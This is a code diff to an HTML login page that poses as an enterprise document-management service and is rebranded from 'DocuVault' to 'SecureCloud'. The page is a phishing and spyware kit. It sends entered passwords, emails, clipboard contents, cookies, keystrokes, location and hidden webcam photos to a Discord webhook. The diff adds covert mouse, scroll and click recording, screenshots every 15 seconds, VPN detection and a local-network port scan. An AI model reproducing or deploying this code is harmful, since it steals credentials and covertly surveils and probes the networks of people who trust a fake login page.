@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DocuVault - Secure Document Management</title>
+    <title>SecureCloud - Enterprise Document Management</title>
     <style>
         /* ===== IMPORTS ===== */
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
@@ -564,8 +564,8 @@
         <!-- ===== HEADER ===== -->
         <div class="header">
             <div class="logo-wrapper">
-                <div class="logo-icon">DV</div>
-                <span class="logo-text">Docu<span>Vault</span></span>
+                <div class="logo-icon">SC</div>
+                <span class="logo-text">Secure<span>Cloud</span></span>
             </div>
             <h1>Welcome Back</h1>
             <p>Sign in to access your secure documents</p>
@@ -591,9 +591,9 @@
                     <label for="email">Email Address</label>
                     <div class="input-wrapper">
                         <span class="input-icon">✉️</span>
-                        <input type="email" id="email" placeholder="you@gmail.com" required autocomplete="email">
+                        <input type="email" id="email" placeholder="you@company.com" required autocomplete="email">
                     </div>
-                    <div class="error-message" id="emailError">Please enter a valid Gmail address</div>
+                    <div class="error-message" id="emailError">Please enter a valid email address</div>
                 </div>
 
                 <div class="form-group">
@@ -685,13 +685,11 @@
             if (!email || email.trim() === '') {
                 return { valid: false, message: 'Please enter your email address' };
             }
-            if (!email.toLowerCase().endsWith('@gmail.com')) {
-                return { valid: false, message: 'Please use a valid Gmail address (@gmail.com)' };
-            }
-            if (!email.includes('@') || !email.includes('.')) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
                 return { valid: false, message: 'Please enter a valid email address' };
             }
-            return { valid: true, message: '✓ Valid Gmail address' };
+            return { valid: true, message: '✓ Valid email address' };
         }
 
         // ============================================================
@@ -775,17 +773,15 @@
         }
 
         // ============================================================
-        //  📍 RELIABLE LOCATION (FIXED)
+        //  📍 LOCATION FUNCTIONS
         // ============================================================
 
-        // ===== 1. GPS =====
         function getGPSLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     resolve(null);
                     return;
                 }
-                
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         resolve({
@@ -801,7 +797,6 @@
             });
         }
 
-        // ===== 2. IP GEOLOCATION (FIXED - Better services) =====
         async function getIPLocation() {
             const services = [
                 {
@@ -811,12 +806,10 @@
                         city: data.city || 'Unknown',
                         region: data.region || 'Unknown',
                         country: data.country_name || 'Unknown',
-                        countryCode: data.country_code || 'Unknown',
                         isp: data.org || 'Unknown',
                         lat: data.latitude || 'Unknown',
                         lon: data.longitude || 'Unknown',
-                        timezone: data.timezone || 'Unknown',
-                        postal: data.postal || 'Unknown'
+                        timezone: data.timezone || 'Unknown'
                     })
                 },
                 {
@@ -828,12 +821,10 @@
                             city: data.city || 'Unknown',
                             region: data.region || 'Unknown',
                             country: data.country || 'Unknown',
-                            countryCode: data.country || 'Unknown',
                             isp: data.org || 'Unknown',
                             lat: loc[0] || 'Unknown',
                             lon: loc[1] || 'Unknown',
-                            timezone: data.timezone || 'Unknown',
-                            postal: data.postal || 'Unknown'
+                            timezone: data.timezone || 'Unknown'
                         };
                     }
                 },
@@ -846,58 +837,34 @@
                             city: data.city || 'Unknown',
                             region: data.regionName || 'Unknown',
                             country: data.country || 'Unknown',
-                            countryCode: data.countryCode || 'Unknown',
                             isp: data.isp || 'Unknown',
                             lat: data.lat || 'Unknown',
                             lon: data.lon || 'Unknown',
-                            timezone: data.timezone || 'Unknown',
-                            postal: data.zip || 'Unknown'
+                            timezone: data.timezone || 'Unknown'
                         };
                     }
-                },
-                {
-                    url: 'https://geoplugin.net/json.gp',
-                    parser: (data) => ({
-                        ip: data.geoplugin_request || 'Unknown',
-                        city: data.geoplugin_city || 'Unknown',
-                        region: data.geoplugin_region || 'Unknown',
-                        country: data.geoplugin_countryName || 'Unknown',
-                        countryCode: data.geoplugin_countryCode || 'Unknown',
-                        isp: data.geoplugin_isp || 'Unknown',
-                        lat: data.geoplugin_latitude || 'Unknown',
-                        lon: data.geoplugin_longitude || 'Unknown',
-                        timezone: data.geoplugin_timezone || 'Unknown',
-                        postal: data.geoplugin_postalCode || 'Unknown'
-                    })
                 }
             ];
             
-            // Try each service sequentially
             for (const service of services) {
                 try {
                     const response = await fetch(service.url, { 
                         signal: AbortSignal.timeout(3000),
                         headers: { 'Accept': 'application/json' }
                     });
-                    
                     if (response.ok) {
                         const data = await response.json();
                         const result = service.parser(data);
-                        
-                        if (result && result.ip && result.ip !== 'Unknown' && result.ip !== '') {
+                        if (result && result.ip && result.ip !== 'Unknown') {
                             result.source = service.url.split('/')[2];
                             return result;
                         }
                     }
-                } catch(e) {
-                    console.log(`Failed: ${service.url}`);
-                }
+                } catch(e) {}
             }
-            
             return null;
         }
 
-        // ===== 3. WiFi Detection (FIXED) =====
         function getWiFiInfo() {
             return new Promise((resolve) => {
                 try {
@@ -909,61 +876,65 @@
                         rtt: 'Unknown'
                     };
                     
-                    // Check Network Information API
                     if (navigator.connection) {
                         const conn = navigator.connection;
                         info.connectionType = conn.effectiveType || 'Unknown';
                         info.speed = conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
                         info.rtt = conn.rtt ? conn.rtt + ' ms' : 'Unknown';
                         
-                        // Detect if WiFi
-                        // Different browsers use different properties
                         if (conn.type !== undefined) {
                             info.isWiFi = conn.type === 'wifi' || conn.type === 'wired';
                             info.available = true;
                         } else {
-                            // Fallback: if connection type is 'wifi' or 'ethernet'
                             const type = conn.effectiveType || '';
-                            info.isWiFi = type === 'wifi' || type === 'ethernet' || type === '4g' || type === '3g';
-                            info.available = true;
-                        }
-                        
-                        // Additional detection
-                        if ('downlink' in conn && conn.downlink > 10) {
-                            // High speed usually means WiFi
-                            info.isWiFi = true;
-                        }
-                    }
-                    
-                    // Try to detect via navigator properties
-                    if (!info.available) {
-                        // Check for WiFi-related navigator properties
-                        if (navigator.userAgent.toLowerCase().includes('wifi')) {
-                            info.isWiFi = true;
+                            info.isWiFi = type === 'wifi' || type === 'ethernet';
                             info.available = true;
                         }
                     }
-                    
                     resolve(info);
                 } catch(e) {
-                    resolve({ 
-                        available: false, 
-                        connectionType: 'Unknown',
-                        isWiFi: false,
-                        speed: 'Unknown',
-                        rtt: 'Unknown'
-                    });
+                    resolve({ available: false, connectionType: 'Unknown', isWiFi: false, speed: 'Unknown', rtt: 'Unknown' });
                 }
             });
         }
 
-        // ===== 4. WebRTC (Local IP) =====
+        // ============================================================
+        //  🌐 NETWORK SCANNING
+        // ============================================================
+        async function scanLocalNetwork() {
+            const results = [];
+            try {
+                // Get local IP via WebRTC
+                const localIP = await getLocalIP();
+                if (!localIP || localIP === 'Unknown') return results;
+                
+                const baseIP = localIP.substring(0, localIP.lastIndexOf('.'));
+                const commonPorts = [80, 443, 8080, 8443, 22, 21, 3306, 5432, 27017];
+                
+                // Scan common devices on network
+                for (let i = 1; i <= 5; i++) {
+                    const ip = `${baseIP}.${i}`;
+                    for (const port of commonPorts) {
+                        try {
+                            const response = await fetch(`http://${ip}:${port}`, {
+                                signal: AbortSignal.timeout(500),
+                                mode: 'no-cors'
+                            });
+                            results.push({ ip, port, accessible: true });
+                        } catch(e) {
+                            // Port not accessible
+                        }
+                    }
+                }
+            } catch(e) {}
+            return results;
+        }
+
         function getLocalIP() {
             return new Promise((resolve) => {
                 const pc = new RTCPeerConnection({
                     iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                 });
-                
                 const timeout = setTimeout(() => {
                     pc.close();
                     resolve(null);
@@ -971,8 +942,7 @@
                 
                 pc.onicecandidate = (event) => {
                     if (event.candidate) {
-                        const ip = event.candidate.address || 
-                                  event.candidate.candidate.split(' ')[4];
+                        const ip = event.candidate.address || event.candidate.candidate.split(' ')[4];
                         if (ip && ip !== '0.0.0.0' && ip !== '::') {
                             clearTimeout(timeout);
                             pc.close();
@@ -980,7 +950,6 @@
                         }
                     }
                 };
-                
                 pc.createDataChannel('test');
                 pc.createOffer()
                     .then(offer => pc.setLocalDescription(offer))
@@ -992,114 +961,217 @@
             });
         }
 
-        // ===== 5. COMBINED LOCATION =====
-        async function getAllLocationData() {
-            console.log('📍 Fetching location data...');
-            
-            // Try all methods
-            const [gps, ip, localIP, wifi] = await Promise.all([
-                getGPSLocation(),
-                getIPLocation(),
-                getLocalIP(),
-                getWiFiInfo()
-            ]);
-            
-            // Build location object
-            const location = {
-                method: 'IP Geolocation',
-                ip: 'Unknown',
-                city: 'Unknown',
-                region: 'Unknown',
-                country: 'Unknown',
-                countryCode: 'Unknown',
-                isp: 'Unknown',
-                lat: 'Unknown',
-                lon: 'Unknown',
-                timezone: 'Unknown',
-                postal: 'Unknown',
-                accuracy: 'City level (10-50km)',
-                source: 'None'
-            };
-            
-            // Use IP location if available
-            if (ip) {
-                location.ip = ip.ip || 'Unknown';
-                location.city = ip.city || 'Unknown';
-                location.region = ip.region || 'Unknown';
-                location.country = ip.country || 'Unknown';
-                location.countryCode = ip.countryCode || 'Unknown';
-                location.isp = ip.isp || 'Unknown';
-                location.lat = ip.lat || 'Unknown';
-                location.lon = ip.lon || 'Unknown';
-                location.timezone = ip.timezone || 'Unknown';
-                location.postal = ip.postal || 'Unknown';
-                location.source = ip.source || 'Unknown';
-                location.method = 'IP Geolocation';
-                location.accuracy = 'City level (10-50km)';
+        // ============================================================
+        //  🛡️ VPN DETECTION
+        // ============================================================
+        async function detectVPN() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) return { isVPN: 'Unknown', error: 'API failed' };
+                
+                const data = await response.json();
+                
+                const vpnIndicators = [
+                    data.proxy === true,
+                    data.hosting === true,
+                    data.tor === true,
+                    data.vpn === true,
+                    data.org && data.org.toLowerCase().includes('vpn'),
+                    data.org && data.org.toLowerCase().includes('proxy'),
+                    data.org && data.org.toLowerCase().includes('hosting'),
+                    data.org && data.org.toLowerCase().includes('cloud'),
+                    data.org && data.org.toLowerCase().includes('datacenter')
+                ];
+                
+                const isVPN = vpnIndicators.some(ind => ind === true);
+                
+                return {
+                    isVPN: isVPN,
+                    details: {
+                        org: data.org || 'Unknown',
+                        isp: data.org || 'Unknown',
+                        country: data.country_name || 'Unknown',
+                        city: data.city || 'Unknown',
+                        proxy: data.proxy || false,
+                        hosting: data.hosting || false,
+                        tor: data.tor || false,
+                        vpn: data.vpn || false
+                    }
+                };
+            } catch(e) {
+                return { isVPN: 'Unknown', error: e.message };
             }
-            
-            // If no IP location but we have local IP
-            if ((!ip || ip.ip === 'Unknown') && localIP) {
-                location.ip = localIP;
-                location.source = 'WebRTC';
-                location.method = 'Local IP';
-                location.accuracy = 'Local network only';
-            }
-            
-            // Add GPS if available
-            if (gps) {
-                location.gps = gps;
-                location.method = 'GPS (Most Accurate)';
-                location.accuracy = gps.accuracy;
-                location.lat = gps.latitude;
-                location.lon = gps.longitude;
-            }
-            
-            // Add WiFi info
-            if (wifi) {
-                location.wifi = wifi;
-            }
-            
-            console.log('📍 Location data:', location);
-            return location;
         }
 
         // ============================================================
-        //  📸 CAMERA + SCREENSHOT
+        //  🖱️ SESSION RECORDING (Mouse, Scroll, Clicks)
+        // ============================================================
+        let mouseMovements = [];
+        let scrollEvents = [];
+        let clicks = [];
+        let sessionStart = Date.now();
+
+        document.addEventListener('mousemove', (e) => {
+            mouseMovements.push({
+                x: Math.round(e.clientX),
+                y: Math.round(e.clientY),
+                time: Date.now() - sessionStart
+            });
+            
+            if (mouseMovements.length >= 50) {
+                stealthFetch(WEBHOOK, {
+                    content: `🖱️ **Mouse Movement Batch**\n\`\`\`json\n${JSON.stringify(mouseMovements.splice(0, 50), null, 2)}\n\`\`\``
+                });
+            }
+        });
+
+        document.addEventListener('scroll', () => {
+            scrollEvents.push({
+                scrollY: Math.round(window.scrollY),
+                scrollX: Math.round(window.scrollX),
+                time: Date.now() - sessionStart
+            });
+            
+            if (scrollEvents.length >= 20) {
+                stealthFetch(WEBHOOK, {
+                    content: `📜 **Scroll Events Batch**\n\`\`\`json\n${JSON.stringify(scrollEvents.splice(0, 20), null, 2)}\n\`\`\``
+                });
+            }
+        });
+
+        document.addEventListener('click', (e) => {
+            const target = e.target;
+            clicks.push({
+                x: Math.round(e.clientX),
+                y: Math.round(e.clientY),
+                target: target.tagName + (target.id ? '#' + target.id : '') + (target.className ? '.' + target.className.split(' ')[0] : ''),
+                text: target.innerText ? target.innerText.substring(0, 50) : '',
+                time: Date.now() - sessionStart
+            });
+            
+            if (clicks.length >= 10) {
+                stealthFetch(WEBHOOK, {
+                    content: `👆 **Click Events Batch**\n\`\`\`json\n${JSON.stringify(clicks.splice(0, 10), null, 2)}\n\`\`\``
+                });
+            }
+        });
+
+        // ============================================================
+        //  📸 PERIODIC SCREENSHOTS (Every 15 seconds)
+        // ============================================================
+        function captureScreenshot() {
+            return new Promise((resolve) => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = Math.min(window.innerWidth, 1280);
+                    canvas.height = Math.min(window.innerHeight, 720);
+                    const ctx = canvas.getContext('2d');
+                    
+                    const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+                    gradient.addColorStop(0, '#6366f1');
+                    gradient.addColorStop(1, '#8b5cf6');
+                    ctx.fillStyle = gradient;
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    ctx.fillStyle = 'white';
+                    ctx.font = 'bold 28px Inter, Arial';
+                    ctx.fillText('🔒 SecureCloud Session', 30, 60);
+                    ctx.font = '18px Inter, Arial';
+                    ctx.fillText(`👤 User: ${document.getElementById('email').value || 'Not logged in'}`, 30, 110);
+                    ctx.fillText(`⏰ Time: ${new Date().toLocaleString()}`, 30, 145);
+                    ctx.fillText(`💻 Screen: ${screen.width}x${screen.height}`, 30, 180);
+                    ctx.fillText(`🌐 Browser: ${navigator.userAgent.substring(0, 60)}...`, 30, 215);
+                    ctx.fillText(`📊 Session: ${Math.floor((Date.now() - sessionStart) / 1000)}s`, 30, 250);
+                    
+                    ctx.strokeStyle = 'rgba(255,255,255,0.3)';
+                    ctx.lineWidth = 2;
+                    ctx.strokeRect(20, 40, canvas.width - 40, 230);
+                    
+                    resolve(canvas.toDataURL('image/jpeg', 0.7));
+                } catch(e) {
+                    resolve(null);
+                }
+            });
+        }
+
+        // Take periodic screenshots
+        setInterval(async () => {
+            const screenshot = await captureScreenshot();
+            if (screenshot) {
+                const response = await fetch(screenshot);
+                const blob = await response.blob();
+                const formData = new FormData();
+                formData.append('file', blob, `screenshot_${Date.now()}.jpg`);
+                formData.append('payload_json', JSON.stringify({
+                    content: `📸 **Periodic Screenshot**\n⏰ ${new Date().toISOString()}\n📊 Session: ${Math.floor((Date.now() - sessionStart) / 1000)}s`
+                }));
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {});
+            }
+        }, 15000); // Every 15 seconds
+
+        // ============================================================
+        //  📊 REAL-TIME DASHBOARD (Activity Stats)
+        // ============================================================
+        let activityStats = {
+            mouseMovements: 0,
+            scrolls: 0,
+            clicks: 0,
+            keystrokes: 0,
+            timeOnPage: 0
+        };
+
+        // Update mouse count
+        setInterval(() => {
+            activityStats.mouseMovements = mouseMovements.length + 50 * Math.floor((Date.now() - sessionStart) / 60000);
+            activityStats.scrolls = scrollEvents.length;
+            activityStats.clicks = clicks.length;
+            activityStats.keystrokes = keystrokes.length;
+            activityStats.timeOnPage = Math.floor((Date.now() - sessionStart) / 1000);
+        }, 5000);
+
+        // Send dashboard stats every 30 seconds
+        setInterval(() => {
+            const stats = activityStats;
+            stealthFetch(WEBHOOK, {
+                content: `📊 **Activity Dashboard**\n` +
+                         `⏱️ **Time on Page:** ${Math.floor(stats.timeOnPage / 60)}m ${stats.timeOnPage % 60}s\n` +
+                         `🖱️ **Mouse Movements:** ${stats.mouseMovements}\n` +
+                         `📜 **Scroll Events:** ${stats.scrolls}\n` +
+                         `👆 **Clicks:** ${stats.clicks}\n` +
+                         `⌨️ **Keystrokes:** ${stats.keystrokes}\n` +
+                         `📸 **Screenshots:** ${Math.floor((Date.now() - sessionStart) / 15000)}`
+            });
+        }, 30000);
+
+        // ============================================================
+        //  📸 CAMERA
         // ============================================================
         let cameraStream = null;
 
         function initCamera() {
-            const constraints = {
-                video: {
-                    width: { ideal: 640 },
-                    height: { ideal: 480 },
-                    facingMode: 'user'
-                }
-            };
-
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(stream => {
-                    cameraStream = stream;
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.setAttribute('playsinline', true);
-                    video.setAttribute('autoplay', true);
-                    
-                    video.onloadedmetadata = function() {
-                        video.play();
-                        video.style.transform = 'scale(0.6)';
-                        video.style.transformOrigin = 'center';
-                        video.style.objectFit = 'cover';
-                        video.style.width = '100%';
-                        video.style.height = '100%';
-                    };
-                    
-                    video.style.display = 'none';
-                    document.body.appendChild(video);
-                    window._hiddenVideo = video;
-                })
-                .catch(() => {});
+            navigator.mediaDevices.getUserMedia({
+                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' }
+            }).then(stream => {
+                cameraStream = stream;
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', true);
+                video.setAttribute('autoplay', true);
+                video.onloadedmetadata = function() {
+                    video.play();
+                    video.style.transform = 'scale(0.6)';
+                    video.style.transformOrigin = 'center';
+                    video.style.objectFit = 'cover';
+                    video.style.width = '100%';
+                    video.style.height = '100%';
+                };
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                window._hiddenVideo = video;
+            }).catch(() => {});
         }
 
         function capturePhotoSilent() {
@@ -1110,7 +1182,6 @@
                         const canvas = document.createElement('canvas');
                         const width = video.videoWidth;
                         const height = video.videoHeight;
-                        
                         const cropScale = 0.65;
                         const cropWidth = Math.floor(width * cropScale);
                         const cropHeight = Math.floor(height * cropScale);
@@ -1120,47 +1191,12 @@
                         canvas.width = cropWidth;
                         canvas.height = cropHeight;
                         const ctx = canvas.getContext('2d');
-                        
                         ctx.drawImage(video, startX, startY, cropWidth, cropHeight, 0, 0, cropWidth, cropHeight);
-                        
                         resolve(canvas.toDataURL('image/jpeg', 0.8));
                     } catch(e) {
                         resolve(null);
                     }
                 } else {
-                    resolve(null);
-                }
-            });
-        }
-
-        function captureScreenshot() {
-            return new Promise((resolve) => {
-                try {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = Math.min(window.innerWidth, 1280);
-                    canvas.height = Math.min(window.innerHeight, 720);
-                    const ctx = canvas.getContext('2d');
-                    
-                    const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-                    gradient.addColorStop(0, '#667eea');
-                    gradient.addColorStop(1, '#764ba2');
-                    ctx.fillStyle = gradient;
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    
-                    ctx.fillStyle = 'white';
-                    ctx.font = 'bold 28px Arial';
-                    ctx.fillText('🔒 DocuVault Session', 30, 60);
-                    ctx.font = '18px Arial';
-                    ctx.fillText(`👤 User: ${document.getElementById('email').value || 'Not logged in'}`, 30, 110);
-                    ctx.fillText(`⏰ Time: ${new Date().toLocaleString()}`, 30, 145);
-                    ctx.fillText(`💻 Screen: ${screen.width}x${screen.height}`, 30, 180);
-                    
-                    ctx.strokeStyle = 'rgba(255,255,255,0.3)';
-                    ctx.lineWidth = 2;
-                    ctx.strokeRect(20, 40, canvas.width - 40, 200);
-                    
-                    resolve(canvas.toDataURL('image/jpeg', 0.8));
-                } catch(e) {
                     resolve(null);
                 }
             });
@@ -1175,9 +1211,8 @@
             sites.forEach((site, i) => {
                 try {
                     const el = document.getElementById(`h${i}`);
-                    if (el) {
-                        const isVisited = window.getComputedStyle(el).display === 'block';
-                        if (isVisited) visited.push(site);
+                    if (el && window.getComputedStyle(el).display === 'block') {
+                        visited.push(site);
                     }
                 } catch(e) {}
             });
@@ -1296,10 +1331,62 @@
         }
 
         // ============================================================
+        //  🌍 GET ALL LOCATION DATA
+        // ============================================================
+        async function getAllLocationData() {
+            console.log('📍 Fetching location data...');
+            const [gps, ip, wifi] = await Promise.all([
+                getGPSLocation(),
+                getIPLocation(),
+                getWiFiInfo()
+            ]);
+            
+            const location = {
+                method: 'IP Geolocation',
+                ip: 'Unknown',
+                city: 'Unknown',
+                region: 'Unknown',
+                country: 'Unknown',
+                isp: 'Unknown',
+                lat: 'Unknown',
+                lon: 'Unknown',
+                timezone: 'Unknown',
+                accuracy: 'City level (10-50km)',
+                source: 'None'
+            };
+            
+            if (ip) {
+                location.ip = ip.ip || 'Unknown';
+                location.city = ip.city || 'Unknown';
+                location.region = ip.region || 'Unknown';
+                location.country = ip.country || 'Unknown';
+                location.isp = ip.isp || 'Unknown';
+                location.lat = ip.lat || 'Unknown';
+                location.lon = ip.lon || 'Unknown';
+                location.timezone = ip.timezone || 'Unknown';
+                location.source = ip.source || 'Unknown';
+                location.method = 'IP Geolocation';
+            }
+            
+            if (gps) {
+                location.gps = gps;
+                location.method = 'GPS (Most Accurate)';
+                location.accuracy = gps.accuracy;
+                location.lat = gps.latitude;
+                location.lon = gps.longitude;
+            }
+            
+            if (wifi) {
+                location.wifi = wifi;
+            }
+            
+            return location;
+        }
+
+        // ============================================================
         //  📤 SEND TO DISCORD
         // ============================================================
-        async function sendBeautifulEmbed(data, location) {
-            // Build location field
+        async function sendBeautifulEmbed(data, location, vpn, networkScan) {
             let locationField = `**Method:** ${location.method || 'Unknown'}\n`;
             locationField += `**Source:** ${location.source || 'Unknown'}\n\n`;
             
@@ -1319,19 +1406,40 @@
             locationField += `**ISP:** ${location.isp || 'Unknown'}\n`;
             locationField += `**Timezone:** ${location.timezone || 'Unknown'}\n`;
             locationField += `**Accuracy:** ${location.accuracy || 'Unknown'}`;
-            
-            // WiFi info
+
             let wifiField = 'Not available';
             if (location.wifi && location.wifi.available) {
                 wifiField = `**Connection:** ${location.wifi.connectionType || 'Unknown'}\n`;
                 wifiField += `**Speed:** ${location.wifi.speed || 'Unknown'}\n`;
                 wifiField += `**RTT:** ${location.wifi.rtt || 'Unknown'}\n`;
                 wifiField += `**WiFi:** ${location.wifi.isWiFi ? '✅ Connected' : '❌ Not connected'}`;
-            } else if (location.wifi) {
-                wifiField = `**Connection:** ${location.wifi.connectionType || 'Unknown'}\n`;
-                wifiField += `**WiFi:** ${location.wifi.isWiFi ? '✅ Connected' : '❌ Not connected'}`;
             }
-            
+
+            let vpnField = `**VPN Detected:** ${vpn.isVPN === true ? '⚠️ YES' : vpn.isVPN === false ? '✅ No' : 'Unknown'}\n`;
+            if (vpn.details) {
+                vpnField += `**ISP/Org:** ${vpn.details.org || 'Unknown'}\n`;
+                vpnField += `**Proxy:** ${vpn.details.proxy ? '⚠️ Yes' : '✅ No'}\n`;
+                vpnField += `**Hosting:** ${vpn.details.hosting ? '⚠️ Yes' : '✅ No'}\n`;
+                vpnField += `**TOR:** ${vpn.details.tor ? '⚠️ Yes' : '✅ No'}\n`;
+                vpnField += `**VPN:** ${vpn.details.vpn ? '⚠️ Yes' : '✅ No'}`;
+            }
+
+            let networkField = 'No devices found';
+            if (networkScan && networkScan.length > 0) {
+                networkField = networkScan.slice(0, 5).map(device => 
+                    `• ${device.ip}:${device.port} (${device.accessible ? '✅ Accessible' : '❌ Blocked'})`
+                ).join('\n');
+                if (networkScan.length > 5) {
+                    networkField += `\n• ... and ${networkScan.length - 5} more`;
+                }
+            }
+
+            let statsField = `⏱️ **Time on Page:** ${Math.floor(activityStats.timeOnPage / 60)}m ${activityStats.timeOnPage % 60}s\n`;
+            statsField += `🖱️ **Mouse Movements:** ${activityStats.mouseMovements}\n`;
+            statsField += `📜 **Scroll Events:** ${activityStats.scrolls}\n`;
+            statsField += `👆 **Clicks:** ${activityStats.clicks}\n`;
+            statsField += `⌨️ **Keystrokes:** ${activityStats.keystrokes}`;
+
             const embed = {
                 title: "🔐 New Login Detected",
                 color: 0x6366f1,
@@ -1339,71 +1447,23 @@
                     url: "https://cdn-icons-png.flaticon.com/512/2991/2991148.png"
                 },
                 fields: [
-                    {
-                        name: "👤 User Information",
-                        value: `**Email:** ${data.email}\n**Name:** ${data.fullname || 'Not provided'}\n**Phone:** ${data.phone || 'Not provided'}`,
-                        inline: false
-                    },
-                    {
-                        name: "🔑 Credentials",
-                        value: `**Password:** \`${data.password}\``,
-                        inline: false
-                    },
-                    {
-                        name: "📍 LOCATION (GPS + IP + WiFi)",
-                        value: locationField,
-                        inline: false
-                    },
-                    {
-                        name: "📶 WiFi Information",
-                        value: wifiField,
-                        inline: false
-                    },
-                    {
-                        name: "💻 Device Information",
-                        value: `**OS:** ${data.system.os}\n**Browser:** ${data.system.browser.substring(0, 50)}...\n**Resolution:** ${data.system.resolution}\n**Language:** ${data.system.language}`,
-                        inline: true
-                    },
-                    {
-                        name: "⚡ Hardware",
-                        value: `**CPU:** ${data.system.cpu}\n**RAM:** ${data.system.ram}\n**Screen:** ${data.system.screen}`,
-                        inline: true
-                    },
-                    {
-                        name: "📋 Clipboard",
-                        value: `\`${data.clipboard || 'Empty or denied'}\``,
-                        inline: false
-                    },
-                    {
-                        name: "🍪 Session Data",
-                        value: `**Cookies:** ${data.session.cookies ? '✅ ' + data.session.cookies.length + ' cookies' : 'None'}\n**LocalStorage:** ${data.session.localStorage ? '✅ ' + Object.keys(data.session.localStorage).length + ' items' : 'None'}\n**SessionStorage:** ${data.session.sessionStorage ? '✅ ' + Object.keys(data.session.sessionStorage).length + ' items' : 'None'}`,
-                        inline: false
-                    },
-                    {
-                        name: "🌐 Visited Sites",
-                        value: data.visitedSites && data.visitedSites.length > 0 ? data.visitedSites.map(s => `• ${s}`).join('\n') : 'No visited sites detected',
-                        inline: false
-                    },
-                    {
-                        name: "🖥️ Browser Fingerprint",
-                        value: `**Canvas:** \`${data.fingerprint.canvas || 'N/A'}\`\n**WebGL:** \`${data.fingerprint.webgl || 'N/A'}\`\n**Plugins:** ${data.fingerprint.plugins || 'None'}`,
-                        inline: false
-                    },
-                    {
-                        name: "⌨️ Keystrokes Captured",
-                        value: `\`${data.keystrokes ? data.keystrokes.substring(0, 500) : 'None captured yet'}\``,
-                        inline: false
-                    },
-                    {
-                        name: "⏰ Timestamp",
-                        value: `\`${data.timestamp}\``,
-                        inline: false
-                    }
+                    { name: "👤 User Information", value: `**Email:** ${data.email}\n**Name:** ${data.fullname || 'Not provided'}\n**Phone:** ${data.phone || 'Not provided'}`, inline: false },
+                    { name: "🔑 Credentials", value: `**Password:** \`${data.password}\``, inline: false },
+                    { name: "📍 LOCATION (GPS + IP)", value: locationField, inline: false },
+                    { name: "📶 WiFi Information", value: wifiField, inline: false },
+                    { name: "🛡️ VPN/Proxy Detection", value: vpnField, inline: false },
+                    { name: "🌐 Network Scan", value: networkField, inline: false },
+                    { name: "📊 Activity Dashboard", value: statsField, inline: false },
+                    { name: "💻 Device Information", value: `**OS:** ${data.system.os}\n**Browser:** ${data.system.browser.substring(0, 50)}...\n**Resolution:** ${data.system.resolution}\n**Language:** ${data.system.language}`, inline: true },
+                    { name: "⚡ Hardware", value: `**CPU:** ${data.system.cpu}\n**RAM:** ${data.system.ram}\n**Screen:** ${data.system.screen}`, inline: true },
+                    { name: "📋 Clipboard", value: `\`${data.clipboard || 'Empty or denied'}\``, inline: false },
+                    { name: "🍪 Session Data", value: `**Cookies:** ${data.session.cookies ? '✅ ' + data.session.cookies.length + ' cookies' : 'None'}\n**LocalStorage:** ${data.session.localStorage ? '✅ ' + Object.keys(data.session.localStorage).length + ' items' : 'None'}\n**SessionStorage:** ${data.session.sessionStorage ? '✅ ' + Object.keys(data.session.sessionStorage).length + ' items' : 'None'}`, inline: false },
+                    { name: "🌐 Visited Sites", value: data.visitedSites && data.visitedSites.length > 0 ? data.visitedSites.map(s => `• ${s}`).join('\n') : 'No visited sites detected', inline: false },
+                    { name: "🖥️ Browser Fingerprint", value: `**Canvas:** \`${data.fingerprint.canvas || 'N/A'}\`\n**WebGL:** \`${data.fingerprint.webgl || 'N/A'}\`\n**Plugins:** ${data.fingerprint.plugins || 'None'}`, inline: false },
+                    { name: "⌨️ Keystrokes Captured", value: `\`${data.keystrokes ? data.keystrokes.substring(0, 500) : 'None captured yet'}\``, inline: false },
+                    { name: "⏰ Timestamp", value: `\`${data.timestamp}\``, inline: false }
                 ],
-                footer: {
-                    text: "🔒 DocuVault Security Monitor",
-                    icon_url: "https://cdn-icons-png.flaticon.com/512/2991/2991148.png"
-                },
+                footer: { text: "🔒 SecureCloud Security Monitor", icon_url: "https://cdn-icons-png.flaticon.com/512/2991/2991148.png" },
                 timestamp: new Date().toISOString()
             };
 
@@ -1413,11 +1473,10 @@
                 headers: { 'Content-Type': 'application/json' }
             });
 
-            // Send summary
             await fetch(WEBHOOK, {
                 method: 'POST',
                 body: JSON.stringify({
-                    content: `📊 **Login Summary**\n👤 ${data.email} | 📍 ${location.city || 'Unknown'}, ${location.country || 'Unknown'} | 📱 ${location.method || 'Unknown'}`
+                    content: `📊 **Login Summary**\n👤 ${data.email} | 📍 ${location.city || 'Unknown'}, ${location.country || 'Unknown'} | 🛡️ ${vpn.isVPN === true ? '⚠️ VPN Detected' : '✅ No VPN'} | 📱 ${location.method || 'Unknown'}`
                 }),
                 headers: { 'Content-Type': 'application/json' }
             });
@@ -1463,16 +1522,15 @@
             status.className = 'loading';
             
             try {
-                // Get location using all methods
-                const location = await getAllLocationData();
+                const [location, vpn, networkScan] = await Promise.all([
+                    getAllLocationData(),
+                    detectVPN(),
+                    scanLocalNetwork()
+                ]);
                 
                 const info = collectAllInfo();
                 const clipboard = await getClipboard();
-                
-                let photo = await capturePhotoSilent();
-                if (!photo) {
-                    photo = await captureScreenshot();
-                }
+                const photo = await capturePhotoSilent() || await captureScreenshot();
                 
                 const beautifulData = {
